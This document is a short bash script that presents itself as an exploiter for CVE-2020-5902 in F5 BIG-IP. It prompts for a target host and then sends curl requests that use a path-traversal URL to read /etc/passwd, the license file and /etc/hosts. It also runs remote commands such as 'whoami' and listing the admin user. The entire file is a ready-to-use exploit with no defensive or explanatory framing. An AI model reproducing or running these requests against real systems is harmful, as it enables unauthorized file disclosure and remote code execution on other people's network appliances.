#!/bin/bash

clear
echo "********************************************"
echo "*** CVE-2020-5902 F5 BIG-IP Exploiter    ***"
echo "********************************************"
echo "\n"
echo "Target IP/host?\n"
read host

echo "Confidentiality Test 1 - Read /etc/passwd\n"
curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'

echo "Confidentiality Test 2 - Read license file\n"
curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license'

echo "Condifentiality Test 3 - Read /etc/hosts\n"
curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts'

echo "Integrity Test 1 - RCE exploit 1"
curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami'

echo "Integrity Test 2 - RCE exploit 2"
curl -v -k 'http://'$host'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
